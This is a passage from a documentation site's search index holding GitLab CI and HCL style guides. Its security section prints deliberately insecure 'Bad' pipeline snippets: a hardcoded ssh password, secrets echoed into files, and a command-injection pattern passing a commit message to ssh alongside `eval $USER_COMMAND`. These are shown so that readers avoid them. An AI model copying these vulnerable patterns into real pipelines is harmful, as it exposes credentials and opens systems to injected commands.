image: python:3.11-slim\n  script:\n    - pip install -r requirements.txt\n    - pytest\n  only:\n    changes:\n      - backend/**/*\n      - requirements.txt\n\ntest:frontend:\n  stage: test\n  image: node:18-alpine\n  script:\n    - npm ci\n    - npm test\n  only:\n    changes:\n      - frontend/**/*\n      - package.json\n      - package-lock.json\n\ntest:infrastructure:\n  stage: test\n  image: hashicorp/terraform:latest\n  script:\n    - terraform init\n    - terraform validate\n    - terraform plan\n  only:\n    changes:\n      - terraform/**/*\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#cicd-pipeline-test-metrics","title":"CI/CD Pipeline Test Metrics","text":"<p>Monitor pipeline performance:</p> <pre><code>metrics:pipeline:\n  stage: .post\n  image: alpine:latest\n  script:\n    - |\n      echo \"Pipeline Duration: $CI_PIPELINE_DURATION seconds\"\n      echo \"Pipeline Status: $CI_PIPELINE_STATUS\"\n      echo \"Failed Jobs:\"\n      # Log failed jobs for analysis\n  when: always\n  only:\n    - main\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#anti-patterns","title":"Anti-Patterns","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#avoid-no-cache","title":"\u274c Avoid: No Cache","text":"<pre><code>## Bad - Reinstalling dependencies every time\ntest:\n  script:\n    - npm install\n    - npm test\n\n## Good - Using cache\ntest:\n  cache:\n    key: ${CI_COMMIT_REF_SLUG}\n    paths:\n      - node_modules/\n  script:\n    - npm ci\n    - npm test\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#avoid-hardcoded-secrets","title":"\u274c Avoid: Hardcoded Secrets","text":"<pre><code>## Bad - Hardcoded credentials\ndeploy:\n  script:\n    - ssh user@server \"password123\"\n\n## Good - Use CI/CD variables\ndeploy:\n  script:\n    - ssh $DEPLOY_USER@$DEPLOY_SERVER\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#avoid-no-artifact-expiration","title":"\u274c Avoid: No Artifact Expiration","text":"<pre><code>## Bad - Artifacts kept forever\nbuild:\n  artifacts:\n    paths:\n      - dist/\n\n## Good - Set expiration\nbuild:\n  artifacts:\n    paths:\n      - dist/\n    expire_in: 1 week\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#avoid-not-using-rules-instead-of-onlyexcept","title":"\u274c Avoid: Not Using Rules Instead of only/except","text":"<pre><code>## Bad - Using deprecated only/except\ndeploy:\n  only:\n    - main\n  except:\n    - schedules\n  script:\n    - ./deploy.sh\n\n## Good - Use rules\ndeploy:\n  rules:\n    - if: $CI_COMMIT_BRANCH == \"main\" &amp;&amp; $CI_PIPELINE_SOURCE != \"schedule\"\n  script:\n    - ./deploy.sh\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#avoid-running-all-jobs-on-all-branches","title":"\u274c Avoid: Running All Jobs on All Branches","text":"<pre><code>## Bad - Expensive jobs run on every branch\nbuild-docker:\n  script:\n    - docker build -t myapp .\n    - docker push myapp  # \u274c Pushes on every branch!\n\ndeploy-prod:\n  script:\n    - ./deploy-production.sh  # \u274c Deploys from any branch!\n\n## Good - Restrict jobs to appropriate branches\nbuild-docker:\n  rules:\n    - if: $CI_COMMIT_BRANCH == \"main\"\n    - if: $CI_COMMIT_TAG\n  script:\n    - docker build -t myapp:$CI_COMMIT_SHORT_SHA .\n    - docker push myapp:$CI_COMMIT_SHORT_SHA\n\ndeploy-prod:\n  rules:\n    - if: $CI_COMMIT_TAG =~ /^v\\d+\\.\\d+\\.\\d+$/\n  script:\n    - ./deploy-production.sh\n  environment:\n    name: production\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#avoid-not-using-extends-for-shared-configuration","title":"\u274c Avoid: Not Using extends for Shared Configuration","text":"<pre><code>## Bad - Duplicated configuration\ntest-unit:\n  image: node:18\n  before_script:\n    - npm ci\n  script:\n    - npm run test:unit\n\ntest-integration:\n  image: node:18\n  before_script:\n    - npm ci\n  script:\n    - npm run test:integration\n\n## Good - Use extends\n.node-base:\n  image: node:18\n  before_script:\n    - npm ci\n\ntest-unit:\n  extends: .node-base\n  script:\n    - npm run test:unit\n\ntest-integration:\n  extends: .node-base\n  script:\n    - npm run test:integration\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#avoid-not-using-retry-for-flaky-jobs","title":"\u274c Avoid: Not Using Retry for Flaky Jobs","text":"<pre><code>## Bad - Flaky job fails pipeline\nintegration-tests:\n  script:\n    - npm run test:integration  # \u274c No retry on failure\n\n## Good - Retry flaky jobs\nintegration-tests:\n  script:\n    - npm run test:integration\n  retry:\n    max: 2\n    when:\n      - runner_system_failure\n      - stuck_or_timeout_failure\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#security-best-practices","title":"Security Best Practices","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#secrets-management","title":"Secrets Management","text":"<p>Protect sensitive data in CI/CD pipelines:</p> <pre><code>## Bad - Hardcoded secrets in pipeline\ndeploy:\n  script:\n    - echo \"API_KEY=sk-1234567890abcdef\" &gt;&gt; .env\n    - aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE  # \u274c Exposed!\n\n## Good - Use protected CI/CD variables\ndeploy:\n  script:\n    - echo \"API_KEY=$API_KEY\" &gt;&gt; .env  # API_KEY from protected variable\n    - aws configure set aws_access_key_id \"$AWS_ACCESS_KEY_ID\"  # \u2705 From variables\n  only:\n    - main  # Protected branch only\n\n## Good - Use masked variables\nvariables:\n  DATABASE_URL: ${DB_URL}  # Masked in GitLab UI and logs\n\n## Good - Use file-type variables for certificates\ndeploy:\n  before_script:\n    - echo \"$SSH_PRIVATE_KEY\" &gt; ~/.ssh/id_rsa\n    - chmod 600 ~/.ssh/id_rsa\n</code></pre> <p>Key Points:</p> <ul> <li>Store secrets in GitLab CI/CD Variables (Settings &gt; CI/CD &gt; Variables)</li> <li>Enable \"Masked\" to hide values in job logs</li> <li>Enable \"Protected\" to restrict to protected branches only</li> <li>Use \"File\" type for certificates and large secrets</li> <li>Never commit secrets to <code>.gitlab-ci.yml</code></li> <li>Rotate secrets regularly</li> </ul>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#protected-branches-and-runners","title":"Protected Branches and Runners","text":"<p>Restrict pipeline execution to authorized users and branches:</p> <pre><code>## Good - Protected branch deployment\ndeploy_production:\n  stage: deploy\n  script:\n    - ./deploy-prod.sh\n  environment:\n    name: production\n  only:\n    - main  # Protected branch\n  when: manual  # Require manual approval\n\n## Good - Use protected runners for sensitive jobs\ndeploy_production:\n  stage: deploy\n  tags:\n    - protected-runner  # Runner tagged as protected in GitLab\n  script:\n    - ./deploy-prod.sh\n  only:\n    - main\n</code></pre> <p>Key Points:</p> <ul> <li>Configure protected branches (Settings &gt; Repository &gt; Protected branches)</li> <li>Restrict who can merge to protected branches</li> <li>Use protected runners for production deployments</li> <li>Require manual approval for critical deployments</li> <li>Implement approval rules for merge requests</li> </ul>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#docker-image-security","title":"Docker Image Security","text":"<p>Use secure, trusted container images:</p> <pre><code>## Bad - Using latest tag\ntest:\n  image: node:latest  # \u274c Unpredictable, potential security issues\n  script:\n    - npm test\n\n## Good - Pin specific versions\ntest:\n  image: node:20.10.0-alpine  # \u2705 Specific, minimal image\n  script:\n    - npm test\n\n## Good - Use internal registry with scanned images\ntest:\n  image: registry.gitlab.com/myorg/secure-node:20.10.0-alpine\n  script:\n    - npm test\n\n## Good - Scan images for vulnerabilities\nbuild_image:\n  stage: build\n  image: docker:latest\n  services:\n    - docker:dind\n  script:\n    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .\n    - docker scan $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA  # Scan for vulnerabilities\n    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n</code></pre> <p>Key Points:</p> <ul> <li>Always pin specific image versions (avoid <code>latest</code>)</li> <li>Use minimal base images (alpine, distroless)</li> <li>Scan images for vulnerabilities (Trivy, Clair, Snyk)</li> <li>Use trusted registries only</li> <li>Regularly update base images</li> <li>Verify image signatures</li> </ul>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#code-injection-prevention","title":"Code Injection Prevention","text":"<p>Prevent command injection in pipeline scripts:</p> <pre><code>## Bad - Unvalidated user input\ndeploy:\n  script:\n    - ssh user@$DEPLOY_SERVER \"$CI_COMMIT_MESSAGE\"  # \u274c Injection risk!\n    - eval $USER_COMMAND  # \u274c Never use eval!\n\n## Good - Validate and sanitize inputs\ndeploy:\n  script:\n    - |\n      if [[ ! \"$DEPLOY_ENV\" =~ ^(dev|staging|prod)$ ]]; then\n        echo \"Invalid environment\"\n        exit 1\n      fi\n    - ./deploy.sh \"$DEPLOY_ENV\"  # Quoted, validated variable\n\n## Good - Use predefined commands\ndeploy:\n  variables:\n    ALLOWED_COMMANDS: \"deploy.sh status.sh rollback.sh\"\n  script:\n    - |\n      if [[ \" $ALLOWED_COMMANDS \" =~ \" $COMMAND \" ]]; then\n        ./\"$COMMAND\"\n      else\n        echo \"Unauthorized command\"\n        exit 1\n      fi\n</code></pre> <p>Key Points:</p> <ul> <li>Never use <code>eval</code> with user-controlled input</li> <li>Validate all variables before use</li> <li>Use allow-lists for dynamic values</li> <li>Quote all variables in scripts</li> <li>Sanitize commit messages and user inputs</li> <li>Use parameterized commands</li> </ul>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#dependency-security","title":"Dependency Security","text":"<p>Secure third-party dependencies:</p> <pre><code>## Good - Pin dependency versions\nbuild:\n  image: node:20.10.0-alpine\n  script:\n    - npm ci  # Use package-lock.json (deterministic installs)\n    - npm audit  # Check for vulnerabilities\n\n## Good - Verify checksums\nbuild:\n  script:\n    - wget https://example.com/tool.tar.gz\n    - echo \"$EXPECTED_CHECKSUM  tool.tar.gz\" | sha256sum -c  # Verify checksum\n    - tar -xzf tool.tar.gz\n\n## Good - Use dependency scanning\ninclude:\n  - template: Security/Dependency-Scanning.gitlab-ci.yml\n\ndependency_scan:\n  stage: test\n  allow_failure: false  # Fail on vulnerabilities\n</code></pre> <p>Key Points:</p> <ul> <li>Pin all dependency versions (<code>package-lock.json</code>, <code>Gemfile.lock</code>, etc.)</li> <li>Use <code>npm ci</code> instead of <code>npm install</code></li> <li>Run dependency audits (<code>npm audit</code>, <code>bundle audit</code>, etc.)</li> <li>Verify package checksums</li> <li>Use GitLab Dependency Scanning</li> <li>Monitor for supply chain attacks</li> </ul>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#access-control-and-least-privilege","title":"Access Control and Least Privilege","text":"<p>Implement least privilege for pipeline execution:</p> <pre><code>## Good - Use service accounts with minimal permissions\ndeploy_aws:\n  script:\n    - aws s3 sync ./dist s3://my-bucket --delete\n  variables:\n    AWS_ACCESS_KEY_ID: $AWS_DEPLOY_KEY_ID  # Service account with S3-only access\n    AWS_SECRET_ACCESS_KEY: $AWS_DEPLOY_SECRET\n\n## Good - Restrict runner access\ndeploy_production:\n  tags:\n    - production-runner  # Dedicated runner with limited network access\n  only:\n    - main\n  script:\n    - ./deploy.sh\n</code></pre> <p>Key Points:</p> <ul> <li>Use service accounts with minimum required permissions</li> <li>Separate runners by environment (dev, staging, prod)</li> <li>Restrict runner network access</li> <li>Use RBAC for pipeline access control</li> <li>Audit who can trigger pipelines</li> <li>Limit access to protected variables</li> </ul>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#artifact-security","title":"Artifact Security","text":"<p>Secure build artifacts:</p> <pre><code>## Good - Set appropriate artifact expiration\nbuild:\n  script:\n    - npm run build\n  artifacts:\n    paths:\n      - dist/\n    expire_in: 1 week  # Auto-cleanup\n    reports:\n      coverage: coverage/cobertura-coverage.xml\n\n## Good - Protect sensitive artifacts\ndeploy:\n  dependencies:\n    - build\n  script:\n    - |\n      # Encrypt sensitive artifacts before storage\n      tar -czf dist.tar.gz dist/\n      openssl enc -aes-256-cbc -salt -in dist.tar.gz -out dist.tar.gz.enc -k \"$ENCRYPTION_KEY\"\n    - ./deploy.sh dist.tar.gz.enc\n</code></pre> <p>Key Points:</p> <ul> <li>Set appropriate artifact expiration times</li> <li>Don't store secrets in artifacts</li> <li>Encrypt sensitive artifacts</li> <li>Use access controls for artifact download</li> <li>Validate artifact integrity (checksums)</li> <li>Clean up old artifacts regularly</li> </ul>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#audit-logging-and-monitoring","title":"Audit Logging and Monitoring","text":"<p>Monitor pipeline activity:</p> <pre><code>## Good - Log security events\ndeploy:\n  before_script:\n    - echo \"Deployment initiated by $GITLAB_USER_LOGIN at $(date)\"\n    - echo \"Target environment: $CI_ENVIRONMENT_NAME\"\n  script:\n    - ./deploy.sh\n  after_script:\n    - |\n      if [ $CI_JOB_STATUS == \"success\" ]; then\n        ./send-audit-log.sh \"Deployment successful\"\n      else\n        ./send-alert.sh \"Deployment failed - investigation required\"\n      fi\n</code></pre> <p>Key Points:</p> <ul> <li>Enable audit logging for all environments</li> <li>Monitor failed pipeline runs</li> <li>Track who triggered deployments</li> <li>Alert on security policy violations</li> <li>Review access logs regularly</li> <li>Maintain pipeline execution history</li> </ul>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#network-security","title":"Network Security","text":"<p>Secure pipeline network access:</p> <pre><code>## Good - Use VPN or private networks for sensitive operations\ndeploy_database:\n  before_script:\n    - openvpn --config production-vpn.conf  # Connect to private network\n  script:\n    - psql -h $DB_HOST -U $DB_USER -d $DB_NAME &lt; migration.sql\n  after_script:\n    - killall openvpn  # Disconnect VPN\n\n## Good - Restrict outbound connections\ntest:\n  script:\n    - npm test\n  variables:\n    HTTP_PROXY: \"http://proxy.internal:8080\"  # Route through approved proxy\n    HTTPS_PROXY: \"http://proxy.internal:8080\"\n</code></pre> <p>Key Points:</p> <ul> <li>Use VPNs or private networks for database access</li> <li>Restrict outbound internet access from runners</li> <li>Use approved proxies for external connections</li> <li>Implement network segmentation</li> <li>Monitor network traffic from runners</li> <li>Use firewall rules to limit access</li> </ul>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#tool-configuration","title":"Tool Configuration","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#gitlab-ci-local-local-pipeline-testing","title":"gitlab-ci-local - Local Pipeline Testing","text":"<p>Install and configure gitlab-ci-local for testing pipelines locally:</p> <pre><code>## Install gitlab-ci-local (npm)\nnpm install -g gitlab-ci-local\n\n## Install gitlab-ci-local (brew)\nbrew install gitlab-ci-local\n\n## Run entire pipeline\ngitlab-ci-local\n\n## Run specific job\ngitlab-ci-local build\n\n## List all jobs\ngitlab-ci-local --list\n\n## Run with specific file\ngitlab-ci-local --file .gitlab-ci.custom.yml\n\n## Dry run\ngitlab-ci-local --preview\n\n## Use specific variables\ngitlab-ci-local --variable CI_COMMIT_REF_NAME=main\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#gitlab-ci-local-variablesyml","title":".gitlab-ci-local-variables.yml","text":"<pre><code>## .gitlab-ci-local-variables.yml\n## Local development variables\nCI_PROJECT_NAME: my-project\nCI_COMMIT_BRANCH: main\nCI_COMMIT_REF_NAME: main\nDOCKER_REGISTRY: localhost:5000\nDEPLOY_ENV: development\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#gitlab-ci-lint-pipeline-validation","title":"gitlab-ci-lint - Pipeline Validation","text":"<pre><code>## Validate .gitlab-ci.yml syntax (requires GitLab instance)\ngitlab-ci-lint .gitlab-ci.yml\n\n## Using GitLab API\ncurl --header \"PRIVATE-TOKEN: ${GITLAB_TOKEN}\" \\\n  \"https://gitlab.com/api/v4/projects/${PROJECT_ID}/ci/lint\" \\\n  --form \"content@.gitlab-ci.yml\"\n\n## Using glab CLI\nglab ci lint\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#vs-code-settings","title":"VS Code Settings","text":"<pre><code>{\n  \"files.associations\": {\n    \".gitlab-ci*.yml\": \"yaml\"\n  },\n  \"[yaml]\": {\n    \"editor.defaultFormatter\": \"redhat.vscode-yaml\",\n    \"editor.formatOnSave\": true\n  },\n  \"yaml.schemas\": {\n    \"https://gitlab.com/gitlab-org/gitlab/-/raw/master/app/assets/javascripts/editor/schema/ci.json\": [\n      \".gitlab-ci.yml\",\n      \".gitlab-ci.*.yml\"\n    ]\n  },\n  \"yaml.customTags\": [\n    \"!reference sequence\"\n  ]\n}\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#pre-commit-hooks","title":"Pre-commit Hooks","text":"<pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n        files: \\.gitlab-ci.*\\.ya?ml$\n      - id: check-added-large-files\n\n  - repo: https://github.com/adrienverge/yamllint\n    rev: v1.35.1\n    hooks:\n      - id: yamllint\n        files: \\.gitlab-ci.*\\.ya?ml$\n        args: ['-d', '{extends: default, rules: {line-length: {max: 120}}}']\n\n  # Optional: gitlab-ci-local validation\n  - repo: local\n    hooks:\n      - id: gitlab-ci-local-lint\n        name: GitLab CI Local Lint\n        entry: gitlab-ci-local --preview\n        language: system\n        files: \\.gitlab-ci\\.yml$\n        pass_filenames: false\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#yamllint-configuration","title":"yamllint Configuration","text":"<pre><code>## .yamllint\nextends: default\n\nrules:\n  line-length:\n    max: 120\n    level: warning\n  indentation:\n    spaces: 2\n    indent-sequences: true\n  comments:\n    min-spaces-from-content: 1\n  document-start: disable\n  truthy:\n    allowed-values: ['true', 'false']\n  key-duplicates: enable\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#editorconfig","title":"EditorConfig","text":"<pre><code>## .editorconfig\n[.gitlab-ci*.{yml,yaml}]\nindent_style = space\nindent_size = 2\nend_of_line = lf\ncharset = utf-8\ntrim_trailing_whitespace = true\ninsert_final_newline = true\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#makefile","title":"Makefile","text":"<pre><code>## Makefile\n.PHONY: ci-local ci-list ci-validate\n\nci-local:\n gitlab-ci-local\n\nci-list:\n gitlab-ci-local --list\n\nci-validate:\n gitlab-ci-local --preview\n yamllint .gitlab-ci.yml\n @echo \"\u2713 GitLab CI configuration is valid\"\n\nci-job:\n gitlab-ci-local $(JOB)\n\n## Example: make ci-job JOB=build\n\nci-debug:\n gitlab-ci-local --shell-isolation=false $(JOB)\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#gitlab-ci-include-localyml","title":".gitlab-ci-include-local.yml","text":"<p>Template for reusable CI configurations:</p> <pre><code>## .gitlab-ci/templates/docker.yml\n.docker_build:\n  image: docker:24\n  services:\n    - docker:24-dind\n  before_script:\n    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY\n  variables:\n    DOCKER_DRIVER: overlay2\n    DOCKER_TLS_CERTDIR: \"/certs\"\n\n.docker_push:\n  extends: .docker_build\n  script:\n    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA .\n    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#gitlab-ci-workflow-validation-job","title":"GitLab CI Workflow Validation Job","text":"<p>Add to your <code>.gitlab-ci.yml</code>:</p> <pre><code>validate:ci:\n  stage: .pre\n  image: python:3.11-slim\n  before_script:\n    - pip install yamllint\n  script:\n    - yamllint .gitlab-ci.yml\n    - echo \"\u2713 Pipeline configuration is valid\"\n  rules:\n    - changes:\n        - .gitlab-ci.yml\n        - .gitlab-ci/**/*\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#glab-cli-configuration","title":"glab CLI Configuration","text":"<pre><code>## ~/.config/glab-cli/config.yml\nhosts:\n  gitlab.com:\n    user: your-username\n    token: glpat-xxxxxxxxxxxxx\n    git_protocol: ssh\n    api_protocol: https\n\npager:\n  ci: false\n  mr: less\n\neditor: vim\n\nbrowser: firefox\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#docker-compose-for-local-gitlab-runner","title":"Docker Compose for Local GitLab Runner","text":"<pre><code>## docker-compose.gitlab-runner.yml\nversion: '3.8'\n\nservices:\n  gitlab-runner:\n    image: gitlab/gitlab-runner:latest\n    container_name: gitlab-runner-local\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n      - ./gitlab-runner-config:/etc/gitlab-runner\n    restart: unless-stopped\n</code></pre>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#references","title":"References","text":"","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#official-documentation","title":"Official Documentation","text":"<ul> <li>GitLab CI/CD Documentation</li> <li>.gitlab-ci.yml Reference</li> <li>GitLab CI/CD Examples</li> </ul>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/gitlab_ci/#best-practices","title":"Best Practices","text":"<ul> <li>GitLab CI/CD Best Practices</li> <li>Pipeline Efficiency</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["gitlab-ci","gitlab","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/hcl/","title":"HCL Style Guide","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#language-overview","title":"Language Overview","text":"<p>HashiCorp Configuration Language (HCL) is a structured configuration language created by HashiCorp for use in their tools like Terraform, Packer, Nomad, Consul, and Vault. HCL is designed to be human-readable and machine-friendly, combining declarative resource definitions with imperative programming constructs.</p>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Format: Declarative with imperative elements</li> <li>Primary Use: Infrastructure as code, configuration management</li> <li>Key Concepts: Blocks, attributes, expressions, functions</li> <li>Tools: Terraform, Packer, Nomad, Consul, Vault</li> </ul>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Naming Blocks <code>snake_case</code> <code>resource</code>, <code>variable</code>, <code>output</code> Block types lowercase Identifiers <code>snake_case</code> <code>aws_instance</code>, <code>vpc_config</code> Lowercase with underscores Variables <code>snake_case</code> <code>vpc_cidr</code>, <code>instance_type</code> Descriptive names Locals <code>snake_case</code> <code>common_tags</code>, <code>region_map</code> Computed local values Syntax Blocks <code>type \"label\" { }</code> <code>resource \"aws_vpc\" \"main\" { }</code> Type, optional labels, body Attributes <code>key = value</code> <code>cidr_block = \"10.0.0.0/16\"</code> Key-value assignment Comments <code>#</code> or <code>//</code> or <code>/* */</code> <code># Comment</code>, <code>// Comment</code> Single or multi-line Data Types String <code>\"text\"</code> <code>\"hello\"</code> Double-quoted strings Number Numeric <code>42</code>, <code>3.14</code> Integer or float Bool <code>true</code> / <code>false</code> <code>enabled = true</code> Boolean values List <code>[...]</code> <code>[\"a\", \"b\", \"c\"]</code> Ordered collection Map <code>{...}</code> <code>{key = \"value\"}</code> Key-value pairs Formatting Indentation 2 spaces <code>attribute = value</code> Consistent 2-space indent Line Length 120 characters Keep lines reasonable Readability Blank Lines Between blocks <code>resource {...}\\n\\nresource {...}</code> Separate blocks Expressions Interpolation <code>${ }</code> <code>\"${var.name}\"</code> Embed expressions (legacy) References Direct reference <code>var.name</code> Modern syntax (preferred) Functions Built-in functions <code>file(\"path\")</code>, <code>join(\",\", list)</code> Use HCL functions Best Practices Terraform Fmt Use <code>terraform fmt</code> Auto-format files Consistent formatting No Heredocs Avoid when possible Use <code>file()</code> function Better readability","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#basic-syntax","title":"Basic Syntax","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#blocks","title":"Blocks","text":"<pre><code>## Basic block structure\nblock_type \"label1\" \"label2\" {\n  attribute = value\n\n  nested_block {\n    attribute = value\n  }\n}\n\n## Terraform example\nresource \"aws_instance\" \"web\" {\n  ami           = \"ami-0c55b159cbfafe1f0\"\n  instance_type = \"t3.micro\"\n\n  tags = {\n    Name = \"web-server\"\n  }\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#attributes","title":"Attributes","text":"<pre><code>## Simple attributes\nname        = \"my-instance\"\ncount       = 3\nenabled     = true\nprice       = 19.99\n\n## Complex attributes\ntags = {\n  Environment = \"production\"\n  Owner       = \"platform-team\"\n}\n\n## List attributes\navailability_zones = [\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"]\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#comments","title":"Comments","text":"<pre><code>## Single-line comment\n\n// Alternative single-line comment\n\n/*\n  Multi-line\n  comment\n*/\n\nresource \"aws_instance\" \"web\" {\n  ami = \"ami-0c55b159cbfafe1f0\"  # Inline comment\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#data-types","title":"Data Types","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#primitive-types","title":"Primitive Types","text":"<pre><code>## String\nname = \"my-resource\"\ndescription = \"A description with spaces\"\n\n## Number (integer or float)\ncount = 5\nprice = 29.99\n\n## Boolean\nenabled = true\ndisabled = false\n\n## Null\noptional_value = null\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#complex-types","title":"Complex Types","text":"<pre><code>## List (ordered collection)\navailability_zones = [\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"]\nports = [80, 443, 8080]\n\n## Map (key-value pairs)\ntags = {\n  Environment = \"production\"\n  Project     = \"web-app\"\n  CostCenter  = \"engineering\"\n}\n\n## Object (typed structure)\nserver_config = {\n  instance_type = \"t3.micro\"\n  ami           = \"ami-0c55b159cbfafe1f0\"\n  disk_size     = 20\n}\n\n## Tuple (ordered, typed list)\nmixed_tuple = [\"string\", 42, true]\n\n## Set (unordered, unique values)\nunique_zones = toset([\"us-east-1a\", \"us-east-1b\", \"us-east-1a\"])\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#variables","title":"Variables","text":"","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#variable-declaration","title":"Variable Declaration","text":"<pre><code>## Basic variable\nvariable \"instance_type\" {\n  type        = string\n  description = \"EC2 instance type\"\n  default     = \"t3.micro\"\n}\n\n## Variable with validation\nvariable \"region\" {\n  type        = string\n  description = \"AWS region\"\n\n  validation {\n    condition     = contains([\"us-east-1\", \"us-west-2\"], var.region)\n    error_message = \"Region must be us-east-1 or us-west-2.\"\n  }\n}\n\n## Complex variable\nvariable \"server_config\" {\n  type = object({\n    instance_type = string\n    disk_size     = number\n    monitoring    = bool\n  })\n\n  default = {\n    instance_type = \"t3.micro\"\n    disk_size     = 20\n    monitoring    = true\n  }\n}\n\n## Sensitive variable\nvariable \"db_password\" {\n  type      = string\n  sensitive = true\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#variable-usage","title":"Variable Usage","text":"<pre><code>resource \"aws_instance\" \"web\" {\n  ami           = var.ami_id\n  instance_type = var.instance_type\n\n  tags = {\n    Name = \"${var.environment}-web-server\"\n  }\n}\n</code></pre>","tags":["hcl","hashicorp","terraform","packer","nomad","configuration"]},{"location":"02_language_guides/hcl/#locals","title":"Locals","text":"<pre><code>## Define local 